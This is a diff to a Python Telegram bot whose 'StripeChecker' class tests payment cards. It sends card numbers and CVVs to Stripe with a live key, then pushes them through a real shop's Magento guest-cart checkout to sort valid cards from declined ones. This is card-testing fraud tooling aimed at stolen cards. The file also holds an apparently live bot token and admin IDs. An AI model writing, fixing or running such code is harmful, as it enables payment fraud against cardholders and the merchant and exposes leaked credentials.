@@ -6,13 +6,10 @@ from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQu
 import requests
 import json
 import base64
-import random
-import string
 
 # ========== الإعدادات ==========
 BOT_TOKEN = "8166484030:AAHwrm95j131yJxvtlNTAe6S57f5kcfU1ow"
 ADMIN_IDS = [5895491379, 844663875]
-CART_ID = "0Xodo8RBE1CCeaoEix4npV5G3OYOBxOM"
 
 # ========== إحصائيات ==========
 stats = {
@@ -47,20 +44,9 @@ class StripeChecker:
             'accept': 'application/json',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         }
-    
-    def generate_random_email(self):
-        """توليد بريد إلكتروني عشوائي"""
-        username_length = random.randint(8, 12)
-        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=username_length))
-        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'test.com']
-        domain = random.choice(domains)
-        return f"{username}@{domain}"
         
     def check(self, card_number, exp_month, exp_year, cvv):
         try:
-            # توليد بريد إلكتروني عشوائي جديد
-            random_email = self.generate_random_email()
-            
             headers = self.headers.copy()
             headers.update({
                 'content-type': 'application/x-www-form-urlencoded',
@@ -68,7 +54,7 @@ class StripeChecker:
                 'referer': 'https://js.stripe.com/',
             })
             
-            data = f'billing_details[address][state]=CO&billing_details[address][postal_code]=11333&billing_details[address][country]=US&billing_details[address][city]=Napoleon&billing_details[address][line1]=111+North+Street&billing_details[address][line2]=sagh&billing_details[email]={random_email}&billing_details[name]=Card+Test&billing_details[phone]=3609998856&type=card&card[number]={card_number}&card[cvc]={cvv}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
+            data = f'billing_details[address][state]=CO&billing_details[address][postal_code]=11333&billing_details[address][country]=US&billing_details[address][city]=Napoleon&billing_details[address][line1]=111+North+Street&billing_details[address][line2]=sagh&billing_details[email]=test@test.com&billing_details[name]=Card+Test&billing_details[phone]=3609998856&type=card&card[number]={card_number}&card[cvc]={cvv}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
             
             r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
             pm = r.json()
@@ -84,7 +70,7 @@ class StripeChecker:
             })
             
             payload = {
-                'cartId': CART_ID,
+                'cartId': '0Xodo8RBE1CCeaoEix4npV5G3OYOBxOM',
                 'billingAddress': {
                     'countryId': 'US',
                     'regionId': '13',
@@ -92,21 +78,18 @@ class StripeChecker:
                     'telephone': '3609998856',
                     'postcode': '11333',
                     'city': 'Napoleon',
-                    'firstname': 'Card',
-                    'lastname': 'Test',
+                    'firstname': 'saad',
+                    'lastname': 'saad',
                 },
                 'paymentMethod': {
                     'method': 'stripe_payments',
                     'additional_data': {'payment_method': pm_id},
                 },
-                'email': random_email,
+                'email': 'test23627@gmail.com',
             }
             
-            # تم إصلاح URL - استبدال {cartId} بالقيمة الفعلية
-            url = f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information'
-            r = self.session.post(url, headers=headers, json=payload)
+            r = self.session.post('https://www.ironmongeryworld.com/rest/default/V1/guest-carts/0Xodo8RBE1CCeaoEix4npV5G3OYOBxOM/payment-information', headers=headers, json=payload)
             res = r.json()
-            
             if 'message' not in res or 'pi_' not in res['message']:
                 return 'DECLINED', 'Payment intent creation failed'
             client_secret = res['message'].split(': ')[1]
@@ -648,8 +631,6 @@ def main():
     print("[✅] Bot will send results in chat (no channel)")
     print("[✅] Using asyncio.create_task (no threading)")
     print("[✅] Failed Authentication detection enabled")
-    print("[✅] Random email generation enabled")
-    print(f"[✅] Cart ID: {CART_ID}")
     
     app = Application.builder().token(BOT_TOKEN).build()
     
